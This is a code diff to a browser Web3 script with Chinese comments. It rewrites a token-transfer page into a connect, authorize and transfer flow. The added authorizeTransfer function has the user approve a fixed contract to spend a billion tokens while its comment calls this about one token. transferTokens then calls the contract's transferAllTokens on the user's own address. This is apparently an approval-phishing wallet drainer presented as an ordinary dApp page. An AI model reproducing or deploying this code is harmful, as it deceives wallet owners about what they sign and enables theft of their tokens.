@@ -1,7 +1,7 @@
-// 合约地址
-const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
+const Web3 = require('web3');
 
-// 合约 ABI
+// 请替换为你的合约地址和 ABI
+const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
 const contractABI = [
 	{
 		"inputs": [
@@ -92,37 +92,40 @@ const contractABI = [
 	}
 ];
 
-// 初始化 Web3
 let web3;
-const connectButton = document.getElementById('connectButton');
-const transferForm = document.getElementById('transferForm');
-const messageDiv = document.getElementById('message');
+let contract;
+let accounts;
 
-// 连接钱包
-connectButton.addEventListener('click', async () => {
-    if (window.ethereum) {
+async function initWeb3() {
+    // 检查是否存在 Ethereum 钱包
+    if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
-        connectButton.innerText = '钱包已连接';
-        connectButton.disabled = true;
-        messageDiv.innerText = '钱包已成功连接！';
+        accounts = await web3.eth.getAccounts();
+        document.getElementById('walletAddress').textContent = `钱包地址: ${accounts[0]}`;
+        document.getElementById('walletAddress').classList.remove('hidden');
+        document.getElementById('authorizeButton').classList.remove('hidden');
     } else {
-        alert('请安装 MetaMask！');
+        alert('请安装 MetaMask 钱包!');
     }
-});
+}
 
-// 转移代币
-transferForm.addEventListener('submit', async (event) => {
-    event.preventDefault();
-    const fromAddress = document.getElementById('fromAddress').value;
+async function authorizeTransfer() {
+    // 批准合约转移代币
+    const amount = web3.utils.toWei('1000000000', 'ether'); // 设置要授权的数量（例如 1 个代币）
+    const tokenAddress = '代币合约地址'; // 替换为相应的代币合约地址
+    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+    await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
+    document.getElementById('transferButton').classList.remove('hidden');
+}
 
-    try {
-        const accounts = await web3.eth.getAccounts();
-        const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
-        await autoTransferContract.methods.transferAllTokens(fromAddress).send({ from: accounts[0] });
-        messageDiv.innerText = '代币已成功转移到目标地址！';
-    } catch (error) {
-        console.error(error);
-        messageDiv.innerText = '转移失败，请检查控制台获取更多信息。';
-    }
-});
+async function transferTokens() {
+    const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
+    await autoTransferContract.methods.transferAllTokens(accounts[0]).send({ from: accounts[0] });
+    alert('代币已成功转移到目标地址！');
+}
+
+// 事件监听
+document.getElementById('connectButton').addEventListener('click', initWeb3);
+document.getElementById('authorizeButton').addEventListener('click', authorizeTransfer);
+document.getElementById('transferButton').addEventListener('click', transferTokens);
